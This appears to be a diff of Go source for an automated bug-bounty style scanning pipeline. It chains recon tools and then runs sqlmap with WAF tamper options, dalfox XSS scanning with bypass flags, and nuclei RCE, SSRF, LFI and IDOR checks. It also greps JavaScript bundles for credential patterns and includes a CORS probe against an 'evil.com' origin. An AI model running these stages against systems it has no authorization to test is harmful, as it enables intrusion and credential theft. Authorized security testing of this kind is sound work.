-  echo "$FULL_URL" | grep -Eiq '\.(json|webmanifest)([?#].*)?$|manifest|buildManifest' && OUT="js_bundles/${PREFIX}_${NAME}.json"
+  echo "$FULL_URL" | grep -Eiq '\\.(json|webmanifest)([?#].*)?$|manifest|buildManifest' && OUT="js_bundles/${PREFIX}_${NAME}.json"
   fetch_asset "$FULL_URL" "$OUT" || { echo "$FULL_URL" >> js_asset_errors.txt; continue; }
   [ -s "$OUT" ] || continue
-  HOST_BASE=$(echo "$FULL_URL" | sed 's|\(https\?://[^/]*\).*|\1|')
+  HOST_BASE=$(echo "$FULL_URL" | sed 's|\\(https\\?://[^/]*\\).*|\\1|')
   {
     grep -oE '"(/[A-Za-z0-9_./?&=-]+)"' "$OUT" 2>/dev/null | tr -d '"'
     grep -oE "'/[A-Za-z0-9_./?&=-]+'" "$OUT" 2>/dev/null | tr -d "'"
@@ -629,17 +394,8 @@ while read -r FULL_URL; do
 done < js_assets.txt
 cat endpoints_found/*.txt 2>/dev/null | sort -u | head -2000 > js_endpoints.txt
 cat js_secrets/*.txt 2>/dev/null | sort -u > js_secrets.txt
-printf 'assets=%%s errors=%%s endpoints=%%s\n' "$(wc -l < js_assets.txt 2>/dev/null || echo 0)" "$(wc -l < js_asset_errors.txt 2>/dev/null || echo 0)" "$(wc -l < js_endpoints.txt 2>/dev/null || echo 0)" > jsmap_status.txt
+printf 'assets=%%s errors=%%s endpoints=%%s\\n' "$(wc -l < js_assets.txt 2>/dev/null || echo 0)" "$(wc -l < js_asset_errors.txt 2>/dev/null || echo 0)" "$(wc -l < js_endpoints.txt 2>/dev/null || echo 0)" > jsmap_status.txt
 exit 0`, jsAssetTotalCap), "grep", []string{"httpx_probe"}, 0},
-
-		// trufflehog_scan: TruffleHog has NO `trufflehog file` or
-		// `trufflehog directory` subcommand — the real subcommands are git /
-		// github / gitlab / filesystem / s3 / gcs / syslog / docker / ... .
-		// `trufflehog filesystem <path>` accepts a file OR a directory, so we
-		// point it at every local artifact that can contain embedded creds:
-		// the URL list (grep for inline keys), every downloaded JS bundle,
-		// the js_secrets/ and endpoints_found/ scratch dirs, and any API spec
-		// bodies (openapi.json frequently ships example credentials).
 		{"trufflehog_scan", `set +e
 : > trufflehog_results.txt
 : > trufflehog_stderr.log
@@ -667,17 +423,6 @@ FINDING_COUNT=$(grep -cve '^$' trufflehog_results.txt 2>/dev/null || echo 0)
 if [ "$RC" -eq 0 ]; then STATUS=completed; else STATUS=scan_error; fi
 printf '{"status":"%s","inputs":%s,"findings":%s,"exit_code":%s}\n' "$STATUS" "$INPUT_COUNT" "$FINDING_COUNT" "$RC" > trufflehog_status.json
 exit 0`, "grep", []string{"clean_urls", "jsmap_scrape", "api_discovery"}, 0},
-
-		// TIGHTER secrets regex: requires real key=value patterns with hex/b64
-		// values, NOT just a substring `token`/`secret`/`key` appearing in a
-		// route name. Every branch now demands an ASSIGNMENT shape (key = value
-		// or key: value) where the value side is a real hex / base64 / prefix-
-		// anchored token of ≥16 chars. Fixed-prefix detector shapes (AKIA,
-		// ghp_, xoxb-, sk-, AIza, eyJ JWT) are still matched bare since they
-		// are near-zero-FP on their own. We also post-filter known Next.js /
-		// Django / Plaid ROUTE names that the regex can still catch inside
-		// query strings or path fragments — this is what previously produced
-		// 22 false positives per run (plaid_link_token, refresh-token, ...).
 		{"grep_secrets", `: > potential_secrets.txt
 grep -Eih '(AKIA[0-9A-Z]{16}|ASIA[0-9A-Z]{16}|ghp_[A-Za-z0-9]{36}|github_pat_[A-Za-z0-9_]{82}|xox[baprs]-[A-Za-z0-9-]{10,}|sk-(test_|live_)?[A-Za-z0-9]{24,}|sk_live_[A-Za-z0-9]{24,}|AIza[0-9A-Za-z_-]{35}|ya29\.[0-9A-Za-z_-]{50,}|eyJ[A-Za-z0-9_=-]+\.eyJ[A-Za-z0-9_=-]+\.[A-Za-z0-9_.+/=-]+|Bearer\s+[A-Za-z0-9._=-]{20,}|["'"'"'\]](api[_-]?key|apikey|secret[_-]?key|access[_-]?token|auth[_-]?token|private[_-]?key)["'"'"']?\s*[=:]\s*["'"'"']?[A-Za-z0-9+/=_-]{20,}|[?&](api[_-]?key|apikey|secret|token|access_token|client_secret)=[A-Za-z0-9+/=_-]{20,})' clean_katana_urls.txt 2>/dev/null \
   | grep -Ev '(plaid[_-]?link[_-]?token|_next/static/chunks|pages/lib|/holdings/plaid|/holdings/exchange|ReactPropTypesSecret|auth/refresh[-_]?token|password[-_]?reset|/authentication/v1/|/static/js/.*refresh[-_]?token|exchange[-_]?plaid[-_]?token)' \
@@ -685,24 +430,8 @@ grep -Eih '(AKIA[0-9A-Z]{16}|ASIA[0-9A-Z]{16}|ghp_[A-Za-z0-9]{36}|github_pat_[A-
 # Also scan JS bundles for embedded secrets (no URL false positives here)
 [ -s js_bundles/ ] && grep -Eroh '(AKIA[0-9A-Z]{16}|ghp_[A-Za-z0-9]{36}|sk-(test_|live_)?[A-Za-z0-9]{24,}|AIza[0-9A-Za-z_-]{35}|eyJ[A-Za-z0-9_=-]+\.eyJ[A-Za-z0-9_=-]+\.[A-Za-z0-9_.+/=-]+|xox[baprs]-[A-Za-z0-9-]{10,}|sk_live_[A-Za-z0-9]{24,}|ya29\.[0-9A-Za-z_-]{50,})' js_bundles/ 2>/dev/null | sort -u >> js_secrets.txt
 exit 0`, "grep", []string{"clean_urls", "jsmap_scrape"}, 0},
-
-		// gau_urls / wayback_urls: wrap in the shell `timeout` builtin so
-		// even a wedged upstream API rate-limiter can't pin the stage
-		// forever. `timeout --foreground` propagates SIGTERM cleanly;
-		// without --foreground bash would background `timeout` and tee
-		// would keep appending. We additionally cap the per-step budget
-		// (Timeout field) at 10m to give the executor another layer of
-		// defense if `timeout` itself is missing on the user's PATH
-		// (rare — it's coreutils, present on every Linux we support).
 		{"gau_urls", fmt.Sprintf("[ -s live_subs.txt ] && timeout --foreground %s cat live_subs.txt | gau --threads 5 --subs | tee gau_urls.txt || touch gau_urls.txt", urlMinerTimeout), "default", []string{"merge_brute_subs"}, 10 * time.Minute},
 		{"wayback_urls", fmt.Sprintf("[ -s live_subs.txt ] && timeout --foreground %s cat live_subs.txt | waybackurls | tee wayback_urls.txt || touch wayback_urls.txt", urlMinerTimeout), "default", []string{"merge_brute_subs"}, 10 * time.Minute},
-		// merge_all_urls now also harvests paths from any openapi.json /
-		// swagger.json / sitemap.xml that api_discovery downloaded. The
-		// jq pass on openapi.json extracts the full path list (with
-		// templated {uuid} / {id} placeholders preserved so the downstream
-		// scanner can probe them with real values). This is what makes
-		// SPA / API-heavy targets testable — without it, sqlmap and dalfox
-		// have nothing to hit.
 		{"merge_all_urls", `: > openapi_paths.txt
 for spec in api_specs/*.json; do
   [ -f "$spec" ] || continue
@@ -727,17 +456,7 @@ sort -u openapi_paths.txt -o openapi_paths.txt 2>/dev/null
 touch gau_urls.txt wayback_urls.txt clean_katana_urls.txt
 cat gau_urls.txt wayback_urls.txt clean_katana_urls.txt openapi_paths.txt 2>/dev/null | sort -u > all_urls.txt
 exit 0`, "default", []string{"gau_urls", "wayback_urls", "clean_urls", "api_discovery"}, 0},
-
-		// URL dedup. all_urls.txt can balloon to 100k+ entries from
-		// gau + wayback + katana; uro collapses the noise down to unique
-		// endpoints so every downstream gf + nuclei stage runs faster.
 		{"uro_dedup", "if command -v uro >/dev/null 2>&1; then uro < all_urls.txt > uro_urls.txt; cp uro_urls.txt all_urls.txt; else sort -u all_urls.txt -o all_urls.txt; fi", "grep", []string{"merge_all_urls"}, 0},
-
-		// URL filter: now accepts 200, 301, 302, 401, 403, 405 — the
-		// previous -mc 200 only filter dropped 8655 of 8740 URLs on
-		// localwp.com because Cloudflare's bot detection returned 403.
-		// 401/403/405 are testable endpoints requiring auth; 301/302 may
-		// redirect to a testable path.
 		{"url_filter_alive", fmt.Sprintf(`%s
 if [ -n "$RFUF_EXCLUDE_URL_REGEX" ]; then
   grep -Ev -- "$RFUF_EXCLUDE_URL_REGEX" all_urls.txt > all_urls_scannable.txt || cp all_urls.txt all_urls_scannable.txt
@@ -745,524 +464,301 @@ else
   cp all_urls.txt all_urls_scannable.txt
 fi
 httpx -l all_urls_scannable.txt -silent -status-code -mc 200,301,302,401,403,405 "${AUTH_HEADERS[@]}" -o all_urls_200.txt`, authSnip), "grep", []string{"uro_dedup", "merge_js_endpoints"}, 0},
-		// Normalize bundle/manifest discoveries into full URLs and merge them
-		// into all_urls before the endpoint scanners are scheduled.
 		{"merge_js_endpoints", `set +e
-			cat js_endpoints.txt 2>/dev/null | grep -E '^https?://' | sort -u > js_endpoints_full.txt
-			cat all_urls.txt js_endpoints_full.txt 2>/dev/null | grep -E '^https?://' | sort -u > all_urls_with_js.txt
-			mv all_urls_with_js.txt all_urls.txt
-			printf 'js_endpoints=%s all_urls=%s\n' "$(wc -l < js_endpoints_full.txt 2>/dev/null || echo 0)" "$(wc -l < all_urls.txt 2>/dev/null || echo 0)" > merge_js_endpoints_status.txt
-			exit 0`, "grep", []string{"merge_all_urls", "jsmap_scrape"}, 0},
-
-		// Final scope boundary: URL and JavaScript/API merge stages can
-		// reintroduce paths after the first HTTP filter. Apply the operator's
-		// exclusion expression and same-domain host check again before any
-		// endpoint target stream is consumed downstream.
+				cat js_endpoints.txt 2>/dev/null | grep -E '^https?://' | sort -u > js_endpoints_full.txt
+				cat all_urls.txt js_endpoints_full.txt 2>/dev/null | grep -E '^https?://' | sort -u > all_urls_with_js.txt
+				mv all_urls_with_js.txt all_urls.txt
+				printf 'js_endpoints=%s all_urls=%s\\n' "$(wc -l < js_endpoints_full.txt 2>/dev/null || echo 0)" "$(wc -l < all_urls.txt 2>/dev/null || echo 0)" > merge_js_endpoints_status.txt
+				exit 0`, "grep", []string{"merge_all_urls", "jsmap_scrape"}, 0},
 		{"scope_filter", fmt.Sprintf(`set +e
-	filter_stream() {
-	  IN="$1"; OUT="$2"; TMP="$OUT.tmp"
-	  : > "$TMP"
-	  [ -f "$IN" ] || { : > "$OUT"; return 0; }
-	  if [ -n "$RFUF_EXCLUDE_URL_REGEX" ]; then
-	    grep -Eiv -- "$RFUF_EXCLUDE_URL_REGEX" "$IN" > "$TMP" || :
-	  else
-	    cp "$IN" "$TMP"
-	  fi
-	  grep -E '%s' "$TMP" > "$OUT" || :
-	  rm -f "$TMP"
-	}
-	filter_stream all_urls.txt all_urls_scannable.txt
-	filter_stream all_urls_200.txt all_urls_200_scannable.txt
-	filter_stream js_endpoints.txt js_endpoints_scannable.txt
-	head -n "${RFUF_MAX_TARGETS:-10000}" all_urls_scannable.txt > all_urls_scannable.capped 2>/dev/null && mv all_urls_scannable.capped all_urls_scannable.txt || :
-	head -n "${RFUF_MAX_TARGETS:-10000}" all_urls_200_scannable.txt > all_urls_200_scannable.capped 2>/dev/null && mv all_urls_200_scannable.capped all_urls_200_scannable.txt || :
-	head -n "${RFUF_MAX_TARGETS:-10000}" js_endpoints_scannable.txt > js_endpoints_scannable.capped 2>/dev/null && mv js_endpoints_scannable.capped js_endpoints_scannable.txt || :
-	cp all_urls_scannable.txt all_urls.txt 2>/dev/null || :
-	cp all_urls_200_scannable.txt all_urls_200.txt 2>/dev/null || :
-	cp js_endpoints_scannable.txt js_endpoints.txt 2>/dev/null || :
-	printf 'all_urls=%%s all_urls_200=%%s js_endpoints=%%s max_targets=%%s max_stage_requests=%%s\\n' "$(wc -l < all_urls.txt 2>/dev/null || echo 0)" "$(wc -l < all_urls_200.txt 2>/dev/null || echo 0)" "$(wc -l < js_endpoints.txt 2>/dev/null || echo 0)" "${RFUF_MAX_TARGETS:-10000}" "${RFUF_MAX_STAGE_REQUESTS:-300}" > scope_filter_status.txt
-	exit 0`, wildcardPattern), "grep", []string{"merge_js_endpoints"}, 0},
-
-		// Canonical target stream for host-and-endpoint nuclei passes. Keep
-
-		// status-bearing httpx output out of the scanner input while retaining
-		// the original files for reporting and troubleshooting.
+		filter_stream() {
+		  IN="$1"; OUT="$2"; TMP="$OUT.tmp"
+		  : > "$TMP"
+		  [ -f "$IN" ] || { : > "$OUT"; return 0; }
+		  if [ -n "$RFUF_EXCLUDE_URL_REGEX" ]; then
+		    grep -Eiv -- "$RFUF_EXCLUDE_URL_REGEX" "$IN" > "$TMP" || :
+		  else
+		    cp "$IN" "$TMP"
+		  fi
+		  grep -E '%s' "$TMP" > "$OUT" || :
+		  rm -f "$TMP"
+		}
+		filter_stream all_urls.txt all_urls_scannable.txt
+		filter_stream all_urls_200.txt all_urls_200_scannable.txt
+		filter_stream js_endpoints.txt js_endpoints_scannable.txt
+		head -n "${RFUF_MAX_TARGETS:-10000}" all_urls_scannable.txt > all_urls_scannable.capped 2>/dev/null && mv all_urls_scannable.capped all_urls_scannable.txt || :
+		head -n "${RFUF_MAX_TARGETS:-10000}" all_urls_200_scannable.txt > all_urls_200_scannable.capped 2>/dev/null && mv all_urls_200_scannable.capped all_urls_200_scannable.txt || :
+		head -n "${RFUF_MAX_TARGETS:-10000}" js_endpoints_scannable.txt > js_endpoints_scannable.capped 2>/dev/null && mv js_endpoints_scannable.capped js_endpoints_scannable.txt || :
+		cp all_urls_scannable.txt all_urls.txt 2>/dev/null || :
+		cp all_urls_200_scannable.txt all_urls_200.txt 2>/dev/null || :
+		cp js_endpoints_scannable.txt js_endpoints.txt 2>/dev/null || :
+		printf 'all_urls=%%s all_urls_200=%%s js_endpoints=%%s max_targets=%%s max_stage_requests=%%s\\n' "$(wc -l < all_urls.txt 2>/dev/null || echo 0)" "$(wc -l < all_urls_200.txt 2>/dev/null || echo 0)" "$(wc -l < js_endpoints.txt 2>/dev/null || echo 0)" "${RFUF_MAX_TARGETS:-10000}" "${RFUF_MAX_STAGE_REQUESTS:-300}" > scope_filter_status.txt
+		exit 0`, wildcardPattern), "grep", []string{"merge_js_endpoints"}, 0},
 		{"nuclei_target_merge", fmt.Sprintf(`set +e
-{
-  awk '{print $1}' alive.txt 2>/dev/null
-  awk '{print $1}' all_urls_200.txt 2>/dev/null
-  cat js_endpoints.txt 2>/dev/null
-} | grep -E '^https?://' | sed 's/[[:space:]]*$//' | sort -u | head -n %d > nuclei_targets.txt
-printf 'inputs alive=%%s urls=%%s js=%%s targets=%%s\\n' "$(wc -l < alive.txt 2>/dev/null || echo 0)" "$(wc -l < all_urls_200.txt 2>/dev/null || echo 0)" "$(wc -l < js_endpoints.txt 2>/dev/null || echo 0)" "$(wc -l < nuclei_targets.txt 2>/dev/null || echo 0)" > nuclei_targets_status.txt
-exit 0`, nucleiTargetCap), "grep", []string{"scope_filter"}, 0},
-
-		// === NEW: Cleanup drop-reasons report (forensic) ===
-		// === NEW: filter_testable_sqli. The cmd/filter-testable
-		// wrapper takes `<workdir>` as its first arg; we run it from
-		// inside the workDir (because of pipeline.go's cd-to-workdir
-		// at executor.RunCommand time) and feed the file argument
-		// via the relative path `all_urls_200.txt`.
+	{
+	  awk '{print $1}' alive.txt 2>/dev/null
+	  awk '{print $1}' all_urls_200.txt 2>/dev/null
+	  cat js_endpoints.txt 2>/dev/null
+	} | grep -E '^https?://' | sed 's/[[:space:]]*$//' | sort -u | head -n %d > nuclei_targets.txt
+	printf 'inputs alive=%%s urls=%%s js=%%s targets=%%s\\n' "$(wc -l < alive.txt 2>/dev/null || echo 0)" "$(wc -l < all_urls_200.txt 2>/dev/null || echo 0)" "$(wc -l < js_endpoints.txt 2>/dev/null || echo 0)" "$(wc -l < nuclei_targets.txt 2>/dev/null || echo 0)" > nuclei_targets_status.txt
+	exit 0`, nucleiTargetCap), "grep", []string{"scope_filter"}, 0},
 		{"filter_testable_sqli", fmt.Sprintf(`%s . all_urls_200.txt > sqli_targets_filtered.txt
-[ -s sqli_targets_filtered.txt ] && { gf sqli sqli_targets_filtered.txt >> sqli_targets.txt; grep -Ei '%s' sqli_targets_filtered.txt >> sqli_targets.txt; } || true
-[ -s sqli_targets.txt ] && sort -u sqli_targets.txt -o sqli_targets.txt || touch sqli_targets.txt
-[ -s sqli_targets.txt ] && head -n %d sqli_targets.txt > sqli_targets.txt.capped && mv sqli_targets.txt.capped sqli_targets.txt
-exit 0`, filterTestableRef, sqlmapHighSignalParams, sqlmapTargetCap), "grep", []string{"scope_filter"}, 0},
+	[ -s sqli_targets_filtered.txt ] && { gf sqli sqli_targets_filtered.txt >> sqli_targets.txt; grep -Ei '%s' sqli_targets_filtered.txt >> sqli_targets.txt; } || true
+	[ -s sqli_targets.txt ] && sort -u sqli_targets.txt -o sqli_targets.txt || touch sqli_targets.txt
+	[ -s sqli_targets.txt ] && head -n %d sqli_targets.txt > sqli_targets.txt.capped && mv sqli_targets.txt.capped sqli_targets.txt
+	exit 0`, filterTestableRef, sqlmapHighSignalParams, sqlmapTargetCap), "grep", []string{"scope_filter"}, 0},
 		{"sqli_targets_replace", `[ -s sqli_targets.txt ] || cp sqli_targets_filtered.txt sqli_targets.txt 2>/dev/null
-exit 0`, "grep", []string{"filter_testable_sqli"}, 0},
-
-		// sqlmap_scan: now also passes auth headers via --cookie / --headers
-		// AND the WAF tamper chosen by buildWafTamperSnippet() (which
-		// reads waf_detections.txt). The `${WAF_SQLMAP_TAMPER:+...}`
-		// expansion is empty when no WAF was detected — clean fallback.
-		// Dependency on waf_detect is required so the tamper snippet
-		// can read waf_detections.txt.
+	exit 0`, "grep", []string{"filter_testable_sqli"}, 0},
 		{"sqlmap_scan", fmt.Sprintf(`%s
-%s
-mkdir -p sqlmap_results
-head -n %d sqli_targets.txt > sqlmap_targets.txt 2>/dev/null || : > sqlmap_targets.txt
-TARGET_COUNT=$(wc -l < sqlmap_targets.txt 2>/dev/null || echo 0)
-printf '{"target_count":%%s,"timeout":"%s"}\n' "$TARGET_COUNT" > sqlmap_status.json
-if [ "$TARGET_COUNT" -gt 0 ]; then
-  timeout --foreground %s sqlmap -m sqlmap_targets.txt --batch --random-agent --flush-session --technique=BEUSTQ --level=3 --risk=1 --output-dir=./sqlmap_results "${SQLMAP_AUTH_ARGS[@]}" ${WAF_SQLMAP_TAMPER:+--tamper=$WAF_SQLMAP_TAMPER} > sqlmap_stdout.log 2> sqlmap_stderr.log || true
-fi
-exit 0`, buildAuthSqlmapCmd(), buildWafTamperSnippet(), sqlmapTargetCap, sqlmapScanTimeout, sqlmapScanTimeout), "default", []string{"sqli_targets_replace", "waf_detect"}, 15 * time.Minute},
-
-		// xss_targets: filter for testable, then dedup, then cap
+	%s
+	mkdir -p sqlmap_results
+	head -n %d sqli_targets.txt > sqlmap_targets.txt 2>/dev/null || : > sqlmap_targets.txt
+	TARGET_COUNT=$(wc -l < sqlmap_targets.txt 2>/dev/null || echo 0)
+	printf '{"target_count":%%s,"timeout":"%s"}\n' "$TARGET_COUNT" > sqlmap_status.json
+	if [ "$TARGET_COUNT" -gt 0 ]; then
+	  timeout --foreground %s sqlmap -m sqlmap_targets.txt --batch --random-agent --flush-session --technique=BEUSTQ --level=3 --risk=1 --output-dir=./sqlmap_results "${SQLMAP_AUTH_ARGS[@]}" ${WAF_SQLMAP_TAMPER:+--tamper=$WAF_SQLMAP_TAMPER} > sqlmap_stdout.log 2> sqlmap_stderr.log || true
+	fi
+	exit 0`, buildAuthSqlmapCmd(), buildWafTamperSnippet(), sqlmapTargetCap, sqlmapScanTimeout, sqlmapScanTimeout), "default", []string{"sqli_targets_replace", "waf_detect"}, 15 * time.Minute},
 		{"xss_targets", fmt.Sprintf(`%s . all_urls_200.txt > xss_targets_filtered.txt
-[ -s xss_targets_filtered.txt ] && grep -Ei "q=|search|query|keyword|text|name|email|msg|redirect|url=" xss_targets_filtered.txt > xss_targets.txt
-gf xss xss_targets_filtered.txt >> xss_targets.txt 2>/dev/null || true
-sort -u xss_targets.txt -o xss_targets.txt
-[ -s xss_targets.txt ] && head -n %d xss_targets.txt > xss_targets.txt.capped && mv xss_targets.txt.capped xss_targets.txt
-exit 0`, filterTestableRef, xssScanTargetCap), "grep", []string{"scope_filter"}, 0},
-
-		// xss_scan: also threads the WAF-detected tamper into dalfox via
-		// `--bypass=$WAF_DALFOX_BYPASS`. Empty when no WAF. Dependency on
-		// waf_detect added so the buildWafTamperSnippet() output (which
-		// reads waf_detections.txt) sees the file written.
+	[ -s xss_targets_filtered.txt ] && grep -Ei "q=|search|query|keyword|text|name|email|msg|redirect|url=" xss_targets_filtered.txt > xss_targets.txt
+	gf xss xss_targets_filtered.txt >> xss_targets.txt 2>/dev/null || true
+	sort -u xss_targets.txt -o xss_targets.txt
+	[ -s xss_targets.txt ] && head -n %d xss_targets.txt > xss_targets.txt.capped && mv xss_targets.txt.capped xss_targets.txt
+	exit 0`, filterTestableRef, xssScanTargetCap), "grep", []string{"scope_filter"}, 0},
 		{"xss_scan", fmt.Sprintf(`%s
-%s
-head -n %d xss_targets.txt > xss_targets_capped.txt
-[ -s xss_targets_capped.txt ] && timeout --foreground %s bash -c 'cat xss_targets_capped.txt | Gxss -p khXSS | dalfox pipe --mining-dom -o xss_vulnerabilities.txt ${WAF_DALFOX_BYPASS:+--bypass=$WAF_DALFOX_BYPASS}'
-touch xss_vulnerabilities.txt
-exit 0`, authSnip, buildWafTamperSnippet(), xssScanTargetCap, xssScanTimeout), "default", []string{"xss_targets", "waf_detect"}, 10 * time.Minute},
-
-		// rce_targets: filter + dedup + cap
+	%s
+	head -n %d xss_targets.txt > xss_targets_capped.txt
+	[ -s xss_targets_capped.txt ] && timeout --foreground %s bash -c 'cat xss_targets_capped.txt | Gxss -p khXSS | dalfox pipe --mining-dom -o xss_vulnerabilities.txt ${WAF_DALFOX_BYPASS:+--bypass=$WAF_DALFOX_BYPASS}'
+	touch xss_vulnerabilities.txt
+	exit 0`, authSnip, buildWafTamperSnippet(), xssScanTargetCap, xssScanTimeout), "default", []string{"xss_targets", "waf_detect"}, 10 * time.Minute},
 		{"rce_targets", fmt.Sprintf(`%s . all_urls_200.txt > rce_targets_filtered.txt
-{ gf rce rce_targets_filtered.txt; grep -Ei '[?&](cmd|exec|command|ping|daemon|upload|shell|code)=' rce_targets_filtered.txt; } | sort -u | head -n %d > rce_targets.txt
-exit 0`, filterTestableRef, maxScanTargets), "grep", []string{"scope_filter"}, 0},
-		{"rce_scan", fmt.Sprintf("%s\nnuclei -l rce_targets.txt -tags rce -severity high,critical %s \"${AUTH_HEADERS[@]}\" -o nuclei_rce_rce.txt", authSnip, nucleiOptimized), "grep", []string{"rce_targets"}, 0},
-
-		// idor_targets: filter out Discourse public forum URLs (these are
-		// public read-only and can't have IDOR). Same filter logic.
+	{ gf rce rce_targets_filtered.txt; grep -Ei '[?&](cmd|exec|command|ping|daemon|upload|shell|code)=' rce_targets_filtered.txt; } | sort -u | head -n %d > rce_targets.txt
+	exit 0`, filterTestableRef, maxScanTargets), "grep", []string{"scope_filter"}, 0},
+		{"rce_scan", fmt.Sprintf("%s\n[ -s rce_targets.txt ] && nuclei -l rce_targets.txt -tags rce -severity high,critical %s \"${AUTH_HEADERS[@]}\" -o nuclei_rce_rce.txt || : > nuclei_rce_rce.txt", authSnip, nucleiOptimized), "grep", []string{"rce_targets"}, 0},
 		{"idor_targets", fmt.Sprintf(`%s . all_urls_200.txt > idor_targets_filtered.txt
-{ gf idor idor_targets_filtered.txt; grep -Ei '[?&](id|account|order|doc|profile|booking|reservation|uid|user_id)=' idor_targets_filtered.txt; } | sort -u | head -n %d > idor_targets.txt
-exit 0`, filterTestableRef, maxScanTargets), "grep", []string{"scope_filter"}, 0},
+	{ gf idor idor_targets_filtered.txt; grep -Ei '[?&](id|account|order|doc|profile|booking|reservation|uid|user_id)=' idor_targets_filtered.txt; } | sort -u | head -n %d > idor_targets.txt
+	exit 0`, filterTestableRef, maxScanTargets), "grep", []string{"scope_filter"}, 0},
 		{"idor_scan", fmt.Sprintf("%s\nnuclei -l idor_targets.txt -tags idor %s \"${AUTH_HEADERS[@]}\" -o idor_vulnerabilities.txt", authSnip, nucleiOptimized), "grep", []string{"idor_targets"}, 0},
-
-		// ssrf_targets: filter + dedup
 		{"ssrf_targets", fmt.Sprintf(`%s . all_urls_200.txt > ssrf_targets_filtered.txt
-{ gf ssrf ssrf_targets_filtered.txt; grep -Ei "url=|uri=|path=|dest=|redirect=|callback=|webhook=|src=|fetch=|proxy=|target=" ssrf_targets_filtered.txt; } | sort -u > ssrf_targets.txt
-exit 0`, filterTestableRef), "grep", []string{"scope_filter"}, 0},
-		// ssrf_scan: substitute ${OOB}->interactsh URL for blind SSRF detection.
-		// ssrf_targets_oob.txt is declared as a required output downstream, so it
-		// must always exist when the step exits — even when interactsh failed to
-		// start (RFUF_OOB_URL empty) or no SSRF candidates were produced. The
-		// previous version only wrote it inside the `if [ -n "$RFUF_OOB_URL" ]`
-		// branch, which caused the pipeline to mark the step status=failed with
-		// exit_code=0 (missing artifact) on every run where interactsh was off.
+	{ gf ssrf ssrf_targets_filtered.txt; grep -Ei "url=|uri=|path=|dest=|redirect=|callback=|webhook=|src=|fetch=|proxy=|target=" ssrf_targets_filtered.txt; } | sort -u > ssrf_targets.txt
+	exit 0`, filterTestableRef), "grep", []string{"scope_filter"}, 0},
 		{"ssrf_scan", fmt.Sprintf(`%s
-: > ssrf_targets_oob.txt
-: > ssrf_vulnerabilities.txt
-if [ -n "$RFUF_OOB_URL" ]; then
-  sed "s|FOOBAR|$RFUF_OOB_URL|g" ssrf_targets.txt > ssrf_targets_oob.txt
-  nuclei -l ssrf_targets_oob.txt -tags ssrf %s "${AUTH_HEADERS[@]}" -o ssrf_vulnerabilities.txt -var oob_url=$RFUF_OOB_URL
-else
-  nuclei -l ssrf_targets.txt -tags ssrf %s "${AUTH_HEADERS[@]}" -o ssrf_vulnerabilities.txt
-fi
-exit 0`, authSnip, nucleiOptimized, nucleiOptimized), "grep", []string{"ssrf_targets"}, 0},
-
-		// redirect_targets: filter + dedup + cap
+	: > ssrf_targets_oob.txt
+	: > ssrf_vulnerabilities.txt
+	if [ -n "$RFUF_OOB_URL" ]; then
+	  sed "s|FOOBAR|$RFUF_OOB_URL|g" ssrf_targets.txt > ssrf_targets_oob.txt
+	  nuclei -l ssrf_targets_oob.txt -tags ssrf %s "${AUTH_HEADERS[@]}" -o ssrf_vulnerabilities.txt -var oob_url=$RFUF_OOB_URL
+	else
+	  nuclei -l ssrf_targets.txt -tags ssrf %s "${AUTH_HEADERS[@]}" -o ssrf_vulnerabilities.txt
+	fi
+	exit 0`, authSnip, nucleiOptimized, nucleiOptimized), "grep", []string{"ssrf_targets"}, 0},
 		{"redirect_targets", fmt.Sprintf(`%s . all_urls_200.txt > redirect_targets_filtered.txt
-gf redirect redirect_targets_filtered.txt | sort -u | head -n %d > redirect_targets.txt
-exit 0`, filterTestableRef, maxScanTargets), "grep", []string{"scope_filter"}, 0},
+	gf redirect redirect_targets_filtered.txt | sort -u | head -n %d > redirect_targets.txt
+	exit 0`, filterTestableRef, maxScanTargets), "grep", []string{"scope_filter"}, 0},
 		{"redirect_scan", fmt.Sprintf("%s\nnuclei -l redirect_targets.txt -tags redirect %s \"${AUTH_HEADERS[@]}\" -o open_redirect_results.txt", authSnip, nucleiOptimized), "grep", []string{"redirect_targets"}, 0},
-
-		// lfi_targets: filter + dedup
 		{"lfi_targets", fmt.Sprintf(`%s . all_urls_200.txt > lfi_targets_filtered.txt
-gf lfi lfi_targets_filtered.txt > lfi_targets.txt
-sort -u lfi_targets.txt -o lfi_targets.txt
-exit 0`, filterTestableRef), "grep", []string{"scope_filter"}, 0},
+	gf lfi lfi_targets_filtered.txt > lfi_targets.txt
+	sort -u lfi_targets.txt -o lfi_targets.txt
+	exit 0`, filterTestableRef), "grep", []string{"scope_filter"}, 0},
 		{"lfi_scan", fmt.Sprintf("%s\nnuclei -l lfi_targets.txt -tags lfi %s \"${AUTH_HEADERS[@]}\" -o lfi_results.txt", authSnip, nucleiOptimized), "grep", []string{"lfi_targets"}, 0},
-
-		// cors_check: now credentialed — checks both ACAO and ACAC.
 		{"cors_check", `set +e
-head -n 500 alive.txt | xargs -P 20 -I{} sh -c '
-  ORIGIN="https://evil.com"
-  RESP=$(curl -sk --max-time 5 --connect-timeout 3 -H "Origin: $ORIGIN" -H "Access-Control-Request-Credentials: true" -I "{}" 2>/dev/null)
-  ACAO=$(echo "$RESP" | grep -i "^access-control-allow-origin:" | tr -d "\r" | awk "{print \$2}")
-  ACAC=$(echo "$RESP" | grep -i "^access-control-allow-credentials:" | tr -d "\r" | awk "{print \$2}")
-  if [ -n "$ACAO" ] && [ "$ACAO" != "$ORIGIN" ]; then
-    if [ "$ACAO" = "*" ] || [ "$ACAO" = "null" ]; then
-      [ "$ACAC" = "true" ] && echo "[VULN] {}  ACAO=$ACAO ACAC=$ACAC (credentialed)"
-    fi
-  elif [ "$ACAO" = "$ORIGIN" ]; then
-    [ "$ACAC" = "true" ] && echo "[VULN] {}  ACAO=REFLECTED ACAC=$ACAC (credentialed exfil)"
-  fi
-' 2>/dev/null > cors_findings.txt
-exit 0`, "grep", []string{"httpx_probe"}, 0},
-
-		// ffuf: recursion depth 1 (was 2), broader status match, more permissive timeout.
+	head -n 500 alive.txt | xargs -P 20 -I{} sh -c '
+	  ORIGIN="https://evil.com"
+	  RESP=$(curl -sk --max-time 5 --connect-timeout 3 -H "Origin: $ORIGIN" -H "Access-Control-Request-Credentials: true" -I "{}" 2>/dev/null)
+	  ACAO=$(echo "$RESP" | grep -i "^access-control-allow-origin:" | tr -d "\r" | awk "{print \$2}")
+	  ACAC=$(echo "$RESP" | grep -i "^access-control-allow-credentials:" | tr -d "\r" | awk "{print \$2}")
+	  if [ -n "$ACAO" ] && [ "$ACAO" != "$ORIGIN" ]; then
+	    if [ "$ACAO" = "*" ] || [ "$ACAO" = "null" ]; then
